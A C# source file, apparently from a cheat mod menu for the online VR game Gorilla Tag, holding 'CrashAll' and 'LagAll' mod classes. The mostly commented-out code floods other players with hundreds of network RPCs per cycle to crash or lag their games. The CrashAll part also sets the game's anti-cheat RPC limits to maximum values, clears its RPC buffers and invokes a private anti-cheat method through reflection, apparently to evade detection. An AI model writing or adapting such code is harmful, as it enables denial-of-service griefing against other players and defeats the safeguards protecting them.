//using Colossal.Menu;
//using Colossal.Patches;
//using ExitGames.Client.Photon;
//using GorillaNetworking;
//using GorillaTagScripts;
//using HarmonyLib;
//using Ionic.Zlib;
//using Photon.Pun;
//using Photon.Realtime;
//using System;
//using System.Collections;
//using System.Collections.Generic;
//using System.Linq;
//using System.Reflection;
//using System.Text;
//using System.Threading.Tasks;
//using UnityEngine;
//using UnityEngine.XR;

//namespace Colossal.Mods
//{
//    public class CrashAll : MonoBehaviour
//    {
//        private static float Garfield = 0f;

//        public void Update()
//        {
//            if (PluginConfig.crashall)
//            {
//                if (Time.time > Garfield)
//                {
//                    GameObject.Find("Environment Objects/LocalObjects_Prefab/City_WorkingPrefab/Arcade_prefab/MainRoom").SetActive(true);
//                    GameObject.Find("Environment Objects/LocalObjects_Prefab/City_WorkingPrefab").SetActive(true);
//                    PhotonView f = GameObject.Find("NetObject_VRTeleporter").GetComponent<PhotonView>();
//                    for (int i = 0; i < 400; i++)
//                    {
//                        f.RPC("ActivateTeleportVFX", RpcTarget.Others, (short)0);
//                        Garfield = Time.time + 2f;
//                    }

//                    PhotonNetwork.MaxResendsBeforeDisconnect = int.MaxValue;
//                    GorillaNot.instance.rpcCallLimit = int.MaxValue;
//                    GorillaNot.instance.rpcErrorMax = int.MaxValue;
//                    GorillaNot.instance.logErrorMax = int.MaxValue;
//                    PhotonNetwork.OpCleanActorRpcBuffer(PhotonNetwork.LocalPlayer.ActorNumber);
//                    PhotonNetwork.OpCleanRpcBuffer(GorillaTagger.Instance.myVRRig.GetView);
//                    PhotonNetwork.RemoveBufferedRPCs(GorillaTagger.Instance.myVRRig.ViewID, null, null);
//                    PhotonNetwork.SendAllOutgoingCommands();
//                    PhotonNetwork.CleanRpcBufferIfMine(GorillaTagger.Instance.myVRRig.GetView);
//                    PhotonNetwork.RemoveRPCs(PhotonNetwork.LocalPlayer);
//                    PhotonNetwork.RemoveRPCsInGroup(9999);
//                    GorillaNot.instance.OnPlayerLeftRoom(PhotonNetwork.LocalPlayer);
//                    typeof(GorillaNot).GetMethod("RefreshRPCs", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(GorillaNot.instance, new object[] { });
//                }
//            }
//            else
//            {
//                Destroy(this.GetComponent<CrashAll>());
//            }
//        }
//    }
//}
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Colossal.Menu;
using Colossal.Patches;
using GorillaTagScripts;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;

namespace Colossal.Mods
{
    public class LagAll : MonoBehaviour
    {
        private static float GTZoneDelay = 0f;
        public void Update()
        {
            if (!PluginConfig.lagall)
            {
                Destroy(this.GetComponent<LagAll>());
            }

            //FriendingManager friendingManager = GameObject.FindObjectOfType<FriendingManager>();
            //if (Time.time > GTZoneDelay)
            //{
            //    GTZoneDelay = Time.time + 0.6f;
            //    for (int i = 0; i < 250; i++)
            //    {
            //        FriendshipGroupDetection.Instance.photonView.RPC("VerifyPartyMember", RpcTarget.All, new object[1]);
            //    }
            //}
        }
    }
}

